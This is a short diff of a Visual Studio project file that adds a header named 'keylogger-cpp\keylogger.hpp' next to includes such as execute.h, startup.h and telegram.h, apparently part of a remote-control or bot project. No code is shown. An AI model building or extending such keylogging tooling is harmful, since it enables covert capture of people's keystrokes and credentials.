@@ -165,6 +165,7 @@
     <ClInclude Include="globals.h" />
     <ClInclude Include="execute.h" />
     <ClInclude Include="commands.h" />
+    <ClInclude Include="keylogger-cpp\keylogger.hpp" />
     <ClInclude Include="parse.h" />
     <ClInclude Include="startup.h" />
     <ClInclude Include="telegram.h" />
